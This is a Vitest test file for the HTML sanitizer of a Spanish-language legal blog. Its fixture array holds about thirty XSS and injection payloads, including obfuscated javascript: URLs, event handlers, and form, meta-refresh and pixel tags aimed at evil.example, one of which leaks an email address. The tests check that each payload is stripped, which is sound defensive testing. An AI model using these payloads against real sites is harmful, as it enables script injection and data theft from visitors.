import { createHash } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import {
  blogHtmlPlainText,
  containsActiveBlogHtml,
  sanitizeBlogRenderedHtml,
  sanitizeBlogSourceHtml,
  serializeBlogJsonLd,
} from '@/lib/blog-html-sanitizer';
import { injectHeadingIds } from '@/lib/blog-toc';
import { normalizeBlogLinksForRender } from '@/lib/blog-link-normalizer';
import { injectContextLinks } from '@/lib/blog-context-linker';

const attacks = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)></svg>',
  '<math><mtext><img src=x onerror=alert(1)></mtext></math>',
  '<a href="javascript:alert(1)">X</a>',
  '<a href="java&#x09;script:alert(1)">X</a>',
  '<a href="JAVASCRIPT:alert(1)">X</a>',
  '<a href="data:text/html,<script>alert(1)</script>">X</a>',
  '<a href="//evil.example/path">X</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example"></object>',
  '<embed src="https://evil.example">',
  '<form action="https://evil.example"><input name="x"></form>',
  "<button formaction='https://evil.example'>Enviar</button>",
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<div style="background-image:url(javascript:alert(1))">X</div>',
  '<div style="position:fixed;z-index:999999">X</div>',
  '<div id="__proto__">X</div>',
  '<a name="location">X</a>',
  '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
  '<img src="https://evil.example/pixel.gif?email=user@example.com" width="1" height="1" alt="pixel">',
  "<a href='vbscript:msgbox(1)'>X</a>",
  '<a href=blob:https://evil.example/id>X</a>',
  '<a href="java\u00a0script:alert(1)">X</a>',
  '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>',
  '<IMG SRC=/safe.webp ONERROR=alert(1) ALT=x>',
  '<a href="javascript:alert(1)" href="/safe">X</a>',
  '<div onclick=alert(1)>Texto jurídico</div>',
  '<a href="java\u0000script:alert(1)">X</a>',
];

describe('blog HTML sanitizer', () => {
  it('conserva la estructura jurídica legítima', () => {
    const input = [
      '<p style="text-align: justify"><strong>Regla</strong> <em>jurídica</em><br>vigente.</p>',
      '<h2>Marco legal</h2><h3>Aplicación</h3><h4>Detalle</h4>',
      '<ul><li>Uno</li></ul><ol><li>Dos</li></ol>',
      '<blockquote>Cita</blockquote><pre><code>art. 1</code></pre>',
      '<table><caption>Plazos</caption><thead><tr><th scope="col">Tipo</th></tr></thead>',
      '<tbody><tr><td colspan="2">Dato</td></tr></tbody></table>',
      '<details open><summary>Fuente</summary><p>Contenido</p></details>',
    ].join('');
    const source = sanitizeBlogSourceHtml(input);
    expect(source.html).toContain('<strong>Regla</strong>');
    expect(source.html).toContain('<h2>Marco legal</h2>');
    expect(source.html).toContain('<table>');
    expect(source.html).toContain('<blockquote>Cita</blockquote>');
    expect(blogHtmlPlainText(source.html)).toBe(blogHtmlPlainText(input));
  });

  it('normaliza h1 del body sin crear un h1 adicional', () => {
    const output = sanitizeBlogSourceHtml('<h1>Título inyectado</h1>').html;
    expect(output).toBe('<h2>Título inyectado</h2>');
    expect(output).not.toContain('<h1');
  });

  it.each(attacks)('bloquea payload activo %#', (attack) => {
    const source = sanitizeBlogSourceHtml(`<p>Texto legítimo</p>${attack}`);
    const rendered = sanitizeBlogRenderedHtml(source.html);
    expect(containsActiveBlogHtml(rendered.html)).toBe(false);
    expect(rendered.html).not.toMatch(/\son[a-z]+\s*=/i);
  });

  it('conserva enlaces permitidos y endurece target blank', () => {
    const input = [
      '<a href="/blog">Interno</a>',
      '<a href="#seccion">Anchor</a>',
      '<a href="?page=2">Query</a>',
      '<a href="https://example.com" target="_blank">HTTPS</a>',
      '<a href="mailto:legal@example.com">Correo</a>',
      '<a href="tel:+50495363724">Teléfono</a>',
    ].join('');
    const output = sanitizeBlogSourceHtml(input).html;
    expect(output).toContain('href="/blog"');
    expect(output).toContain('href="https://example.com" target="_blank" rel="noopener noreferrer"');
    expect(output).toContain('href="mailto:legal@example.com"');
    expect(output).toContain('href="tel:+50495363724"');
  });

  it('elimina IDs de origen y conserva solo IDs seguros generados para headings', () => {
    const source = sanitizeBlogSourceHtml(
      '<h2 id="__proto__">Marco</h2><a name="location">Texto</a>',
    );
    expect(source.html).not.toMatch(/\s(?:id|name)=/);
    const headings = injectHeadingIds(source.html);
    const rendered = sanitizeBlogRenderedHtml(headings.html);
    expect(rendered.html).toContain('<h2 id="marco">');
    expect(headings.headings[0].id).toBe('marco');
  });

  it('preserva CTA y enlaces contextuales generados por la aplicación', () => {
    const source = sanitizeBlogSourceHtml(
      '<h2>Defensa penal en Honduras</h2><p>Un abogado penalista puede orientar el proceso.</p>',
    );
    const headings = injectHeadingIds(source.html);
    const normalized = normalizeBlogLinksForRender(headings.html).html;
    const linked = injectContextLinks(normalized);
    const cta = `${linked}<aside class="my-7 rounded-lg border border-accent/30 bg-surface-alt p-4"><p class="text-sm text-text-secondary leading-relaxed">Consulta</p><a href="/solicitar-consulta#formulario" class="text-sm font-semibold text-primary hover:text-accent-dark" data-event-name="seo_blog_cta_click" data-cta-location="blog_inline" data-cta-topic="penal">Solicitar consulta</a></aside>`;
    const rendered = sanitizeBlogRenderedHtml(cta);
    expect(rendered.html).toContain('id="defensa-penal-en-honduras"');
    expect(rendered.html).toContain('<aside class="my-7 rounded-lg border border-accent/30 bg-surface-alt p-4">');
    expect(rendered.html).toContain('data-event-name="seo_blog_cta_click"');
    expect(rendered.html).toContain('context-link');
    expect(containsActiveBlogHtml(rendered.html)).toBe(false);
  });

  it('es idempotente en ambas etapas', () => {
    const input = '<h2>Norma</h2><p style="text-align:center">Texto <a href="/blog">legal</a>.</p>';
    const source = sanitizeBlogSourceHtml(input).html;
    expect(sanitizeBlogSourceHtml(source).html).toBe(source);
    const withIds = injectHeadingIds(source).html;
    const rendered = sanitizeBlogRenderedHtml(withIds).html;
    expect(sanitizeBlogRenderedHtml(rendered).html).toBe(rendered);
  });

  it('no altera el cuerpo ni el hash editorial persistido', () => {
    const stored = '<p>Texto firmado</p><script>alert(1)</script>';
    const hashBefore = createHash('sha256').update(stored).digest('hex');
    const rendered = sanitizeBlogRenderedHtml(sanitizeBlogSourceHtml(stored).html);
    const hashAfter = createHash('sha256').update(stored).digest('hex');
    expect(hashAfter).toBe(hashBefore);
    expect(rendered.html).not.toContain('<script');
  });

  it('serializa JSON-LD sin permitir cierre de script', () => {
    const json = serializeBlogJsonLd({ answer: '</script><script>alert(1)</script>' });
    expect(json).not.toContain('</script>');
    expect(json).toContain('\\u003c/script\\u003e');
  });
});
